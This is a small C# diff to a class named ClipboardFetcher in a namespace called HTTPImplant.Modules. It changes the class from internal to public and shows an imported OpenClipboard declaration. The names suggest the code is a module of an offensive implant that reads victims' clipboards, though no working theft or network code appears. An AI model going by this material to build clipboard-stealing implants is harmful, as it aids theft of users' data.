@@ -4,7 +4,7 @@ using System.Text;
 
 namespace HTTPImplant.Modules
 {
-    internal class ClipboardFetcher
+    public class ClipboardFetcher
     {
         [DllImport("user32.dll")]
         private static extern bool OpenClipboard(IntPtr hWndNewOwner);
